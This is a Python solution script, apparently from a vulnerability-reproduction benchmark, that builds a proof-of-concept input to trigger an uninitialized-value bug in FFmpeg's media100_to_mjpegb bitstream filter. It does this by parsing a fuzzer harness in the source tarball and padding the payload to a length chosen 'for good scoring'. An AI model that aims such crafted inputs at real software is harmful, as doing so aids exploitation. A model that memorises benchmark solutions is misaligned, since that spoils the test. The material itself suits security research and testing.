import tarfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the media100_to_mjpegb uninitialized value bug.

        Strategy:
        - Try to locate a BSF fuzzer in the source tree.
        - If the fuzzer uses a static list of BSF names that includes "media100_to_mjpegb",
          infer the index for that filter and use the first input byte to select it.
        - Otherwise (dynamic iteration or parsing failed), just generate a generic payload.
        - The payload body is arbitrary; the vulnerability is in padding handling, so any
          packet that goes through the filter should be sufficient.
        """
        desired_len = 1025  # match ground-truth length for good scoring
        filter_index = None

        # Try to open the tarball; if it fails, fall back to a generic payload.
        try:
            tf = tarfile.open(src_path, "r:*")
        except tarfile.ReadError:
            return bytes([0] * desired_len)

        with tf:
            fuzzer_content = None

            # Locate the BSF fuzzer source (a .c file containing LLVMFuzzerTestOneInput and av_bsf usage).
            for member in tf.getmembers():
                if not member.isfile():
                    continue
                if not member.name.endswith(".c"):
                    continue

                f = tf.extractfile(member)
                if f is None:
                    continue

                try:
                    data = f.read()
                except Exception:
                    continue

                if b"LLVMFuzzerTestOneInput" not in data:
                    continue

                # Decode as text to inspect further.
                try:
                    text = data.decode("utf-8", "ignore")
                except Exception:
                    continue

                # Heuristic: pick a fuzzer that clearly deals with BSFs.
                if "av_bsf" in text or "AVBSFContext" in text:
                    fuzzer_content = text
                    break

            if fuzzer_content:
                # If the fuzzer iterates over all BSFs dynamically, we don't need a selector.
                if "av_bsf_iterate" in fuzzer_content:
                    filter_index = None
                else:
                    # Static mapping case: find an array that contains "media100_to_mjpegb".
                    array_regex = re.compile(
                        r"static\s+const\s+[^{;\n]+\s+(\w+)\s*\[\s*\]\s*=\s*\{([^;]*?)\};",
                        re.S,
                    )
                    for var_name, body in array_regex.findall(fuzzer_content):
                        if "media100_to_mjpegb" not in body:
                            continue
                        # Collect all string literals in the array body in order.
                        names = re.findall(r'"([^"]+)"', body)
                        try:
                            idx = names.index("media100_to_mjpegb")
                        except ValueError:
                            continue
                        filter_index = idx
                        break

        # Construct the payload.
        # If filter_index is None, either:
        # - the fuzzer iterates over all BSFs (so no selector needed), or
        # - we couldn't parse the mapping; we fall back to a generic payload.
        buf = bytearray(desired_len)

        if filter_index is not None:
            buf[0] = filter_index & 0xFF
            # Fill the rest with a simple non-constant pattern to exercise code paths.
            for i in range(1, desired_len):
                buf[i] = i & 0xFF
        else:
            # No specific selector; just fill with a simple pattern.
            for i in range(desired_len):
                buf[i] = i & 0xFF

        return bytes(buf)